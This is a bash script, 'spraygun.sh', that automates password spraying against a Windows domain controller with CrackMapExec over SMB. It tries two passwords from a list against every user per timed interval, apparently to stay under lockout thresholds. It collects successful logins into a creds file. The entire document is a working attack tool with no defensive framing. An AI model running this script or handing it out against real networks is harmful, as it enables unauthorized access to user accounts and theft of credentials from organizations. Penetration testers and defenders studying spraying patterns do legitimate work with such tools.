#!/bin/bash

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins (2x per sleep) 

#script to auto-spray with cme


# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - outlog file (not yet)


#check for args
if [ $# -ne 4 ]; then
	echo 'Usage: spraygun.sh dc-ip users-list pass-list sleep-time-in-mins (default 2x per time)'
	exit -1
fi


#alias crackmapexec="cd /opt/CrackMapExec && poetry run crackmapexec"
#trying to put this into /usr/local/bin doesn't work because I suck :(
#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
sleep_timer="sleep $4m"

count=$(wc -l < $3)

while [ $count -gt 0 ]; do
	echo "Starting password spray with 2x every $4"
	
	head -n $count $3 > tmp.txt
	
	for pass in $(cat tmp.txt | head -2); do
		echo "Spraying: $pass"
		poetry run crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /root/Documents/sprays/spraygun.txt
		echo $pass > /root/Documents/sprays/used-passwords.txt

		sleep 5

	done
	
	echo "Found creds: "
	cat /root/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a /root/Documents/sprays/creds.txt
	
	sed -i "1,2d" $3
	
	count=$(wc -l < $3)
	echo "sleeping for $4m"
	$sleep_timer
done

echo "End of file, check your creds!"
